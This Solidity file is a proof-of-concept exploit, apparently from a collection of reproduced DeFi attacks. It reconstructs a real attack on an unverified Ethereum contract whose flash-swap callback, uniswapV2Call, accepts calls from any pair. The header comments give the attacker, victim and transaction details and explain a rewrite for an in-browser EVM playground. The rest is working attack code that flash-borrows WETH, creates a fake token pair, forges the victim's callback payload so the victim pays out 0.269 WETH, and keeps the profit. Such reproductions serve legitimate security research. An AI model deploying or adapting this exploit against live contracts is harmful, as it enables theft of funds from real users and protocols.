// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// @KeyInfo - Total Lost : $1,006.89
// Attacker : 0x87c6D33808F10348Cd9a4Cd825f25BE341d7bA2d
// Attack Contract : 0x46bBB647B61560432b58eCBa6Bd048D691701D82
// Vulnerable Contract : 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc
// Attack Tx : https://etherscan.io/tx/0x6fb78c7737463ea39a23159dd8496c178106b4ee657f2fb6fcb628240c39cd2e
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc#code
// (unverified on Etherscan - no source view available; behaviour is reconstructed
// from the attack tx + the registry write-up)
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1544
//
// Attack summary: The attacker used a real DAI/WETH flash swap to borrow WETH, seeded a
// freshly-created UniswapV2 pair (fake token <-> WETH), then made that fake pair call the
// victim's UniswapV2 flash-swap callback (`uniswapV2Call`). The victim never checks that the
// calling pair is one it created/funded, so it pays out 0.269 WETH of its own treasury to the
// attacker-controlled `paymentTo` address taken straight from the forged callback payload.
// The attacker then drains the manipulated pair and repays the real flash loan, keeping the
// difference as profit.
//
// NOTE ON THIS REWRITE: the original Foundry PoC (test/Unverified6883_exp.sol) uses
// `vm.etch(TEMP_TOKEN, ...)` / `vm.etch(TEMP_HELPER, ...)` to place a fake ERC20 and a no-op
// swap helper at two hardcoded addresses (so the deterministically-computed UniswapV2 pair
// address matches a real on-chain constant), and mints fake tokens to the exploit contract via
// a direct `FakeERC20(...).mint(...)` call from the OUTER Foundry test — both are cheatcodes
// the client-side EVM Playground cannot execute. This version replaces that with real `new`
// deployments performed by the exploit contract itself in its constructor: it deploys its own
// fake ERC20 + no-op helper, mints itself the fake token supply, and lets UniswapV2's factory
// return whatever pair address results (rather than asserting it equals the original mainnet
// attack's precomputed address). The economics are identical because UniswapV2's
// constant-product math depends only on the reserves/amounts involved, never on the specific
// addresses of the pair or its tokens.

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract FakeCallbackExploit {
    address private constant VICTIM = 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc;
    address private constant DAI_WETH_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private constant FLASH_WETH = 100_000_000_000_000_000;
    uint256 private constant VICTIM_WETH_PAYMENT = 269_000_000_000_000_000;
    uint256 private constant TEMP_PAIR_WETH_OUT = 367_892_963_578_592_963;
    uint256 private constant FLASH_REPAY = 100_300_902_708_124_374;
    uint256 private constant PROFIT_WETH = 267_592_060_870_468_589;
    uint256 private constant ROUTE_AMOUNT_HINT = 3_071_891_971_238_012_784_039;
    uint256 private constant HELPER_AMOUNT0_OUT = 2_859_728_258_123_006_471_879_656;
    uint256 private constant NESTED_PAYMENT_AMOUNT = 2 ether;
    uint256 private constant ABI_TUPLE_OFFSET = 0x20;
    uint256 private constant NESTED_TAIL_OFFSET = 0xe0;

    IERC20Like private constant WETH = IERC20Like(WETH_ADDRESS);

    address private immutable _recipient;
    address private immutable _tempToken;
    address private immutable _tempHelper;

    struct VictimCallbackPayload {
        address token0;
        address token1;
        uint256 amount0;
        uint256 amount1;
        uint256 paymentAmount;
        address paymentTo;
        address receiver;
        VictimSwapHop[] hops;
    }

    struct VictimSwapHop {
        address helper;
        address token0;
        address token1;
        uint256 routeAmountHint;
        uint256 amount0Out;
        uint256 amount1Out;
        bytes data;
    }

    constructor(address recipient) {
        _recipient = recipient;

        // Mirrors the outer Foundry test's `vm.etch` + `mint(exploit, ...)` prep, but as real
        // deployments performed by the exploit contract itself instead of cheatcodes.
        FakeERC20 token = new FakeERC20();
        token.mint(address(this), 1_000_000_000 ether);
        _tempToken = address(token);

        _tempHelper = address(new NoopSwapHelper());
    }

    function execute() external {
        IUniswapV2Pair(DAI_WETH_PAIR).swap(0, FLASH_WETH, address(this), bytes("COMPLETE_RECOVERY"));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == DAI_WETH_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == 0 && amount1 == FLASH_WETH, "unexpected flash amount");

        address pair = IUniswapV2Factory(UNISWAP_FACTORY).createPair(_tempToken, WETH_ADDRESS);

        IERC20Like(_tempToken).transfer(pair, 100 ether);
        WETH.transfer(pair, FLASH_WETH);
        IUniswapV2Pair(pair).sync();

        bytes memory victimCallbackData = _victimCallbackData(pair);
        IUniswapV2Pair(pair).swap(1 ether, 0, VICTIM, victimCallbackData);
        require(WETH.balanceOf(pair) == FLASH_WETH + VICTIM_WETH_PAYMENT, "victim payment mismatch");

        IUniswapV2Pair(pair).sync();
        IERC20Like(_tempToken).transfer(pair, 999_999_900 ether);
        IUniswapV2Pair(pair).swap(0, TEMP_PAIR_WETH_OUT, address(this), "");

        WETH.transfer(DAI_WETH_PAIR, FLASH_REPAY);
        WETH.transfer(_recipient, PROFIT_WETH);
    }

    function _victimCallbackData(address pair) private view returns (bytes memory) {
        VictimSwapHop[] memory hops = new VictimSwapHop[](1);
        hops[0] = VictimSwapHop({
            helper: _tempHelper,
            token0: WETH_ADDRESS,
            token1: _tempToken,
            routeAmountHint: ROUTE_AMOUNT_HINT,
            amount0Out: HELPER_AMOUNT0_OUT,
            amount1Out: 0,
            data: _nestedVictimCallbackData(pair)
        });

        return abi.encode(
            VictimCallbackPayload({
                token0: WETH_ADDRESS,
                token1: _tempToken,
                amount0: 0,
                amount1: 0,
                paymentAmount: VICTIM_WETH_PAYMENT,
                paymentTo: pair,
                receiver: VICTIM,
                hops: hops
            })
        );
    }

    function _nestedVictimCallbackData(address pair) private view returns (bytes memory) {
        return abi.encode(
            ABI_TUPLE_OFFSET,
            WETH_ADDRESS,
            _tempToken,
            uint256(0),
            uint256(0),
            NESTED_PAYMENT_AMOUNT,
            pair,
            VICTIM,
            NESTED_TAIL_OFFSET
        );
    }
}

contract FakeERC20 {
    mapping(address => uint256) public balanceOf;

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function symbol() external pure returns (string memory) {
        return "TMP";
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NoopSwapHelper {
    function swap(uint256, uint256, address, bytes calldata) external {}
}
